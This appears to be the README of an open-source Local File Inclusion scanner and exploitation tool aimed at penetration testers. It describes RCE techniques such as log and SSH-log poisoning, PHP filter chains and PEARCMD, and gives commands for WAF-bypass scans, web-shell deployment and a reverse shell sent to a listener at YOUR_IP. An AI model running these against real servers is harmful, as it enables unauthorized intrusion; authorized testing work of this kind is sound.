# LFI-FILLER v3.1: LFI Exploitation Framework


**LFI-FILLER (LFILLER)** is a high-performance, multi-threaded LFI (Local File Inclusion) scanner and exploitation framework designed for security professionals and penetration testers. It automates the process of finding vulnerable parameters, bypassing WAFs, and achieving Remote Code Execution (RCE) via multiple advanced vectors.

## 🚀 Key Features

- **High-Speed Concurrency**: Powered by `ThreadPoolExecutor` for fast multi-parameter scanning.
- **Advanced WAF Bypasses**: Intelligent encoding (URL, Double URL, Unicode, etc.) and OS-specific path normalization.
- **Intelligent Detection**: Uses content-reflection, content-length analysis, and regex patterns to identify valid inclusions accurately.
- **Comprehensive Exploitation Engine**:
    - **Log Poisoning**: Automated RCE via Apache/Nginx logs and User-Agent/Referer injection.
    - **SSH Poisoning**: Injects PHP payloads into SSH authentication logs (`/var/log/auth.log`).
    - **PHP Filter Chaining**: Modern "No Logs" RCE technique using complex `php://filter` chains.
    - **PEARCMD Exploit**: Leverages PEAR manager for direct shell creation.
    - **RFI (Remote File Inclusion)**: Automated inclusion of remote payloads.
- **Automated Shell Deployment**: Creates persistence with mini web shells or triggers interactive reverse shells (Bash, Python, NC, PHP).

## 🛠️ Installation

```bash
git clone https://github.com/SD-DEVSECOPS/LFI_CHECKERS.git
cd LFI_CHECKERS
pip install requests tqdm  # (tqdm is optional for progress tracking if added)
```

## 📖 Usage Examples

### 1. Basic Scan
Scan a target URL for LFI vulnerabilities:
```bash
python3 lfiller.py -u "http://target.com/view.php?file=test"
```

### 2. Full Exploitation & Web Shell
Scan and attempt to deploy a PHP web shell to the server:
```bash
python3 lfiller.py -u "http://target.com/view.php" -webshell
```

### 3. Reverse Shell (Requires Listener)
Start a listener (`nc -lvnp 4444`) and run:
```bash
python3 lfiller.py -u "http://target.com/view.php" -lh YOUR_IP -lp 4444
```

### 4. Bypassing WAFs
Try all encoding techniques to evade simple filters:
```bash
python3 lfiller.py -u "http://target.com/view.php" -e all
```

## 🧪 Advanced Techniques Explained

| Technique | Goal | Requirement |
|-----------|------|-------------|
| **Log Poisoning** | RCE | Readable web logs (Apache/Nginx) |
| **SSH Poisoning** | RCE | SSH access + Readable `auth.log` |
| **PHP Filter Chain** | RCE | LFI on PHP >= 7.0 (No logs needed!) |
| **PEARCMD** | RCE | PEAR manager installed on server |
| **Input Wrappers** | RCE | `allow_url_include = On` or `php://input` access |

## ⚠️ Disclaimer

This tool is for educational purposes and authorized penetration testing only. Unauthorized use against systems you do not have permission to test is illegal. The author is not responsible for any misuse or damage caused by this utility.

## 🤝 Contributing
Contributions, issues, and feature requests are welcome! Feel free to check the [issues page](https://github.com/SD-DEVSECOPS/LFI_CHECKERS/issues).

---
**Maintained by SD-DEVSECOPS**
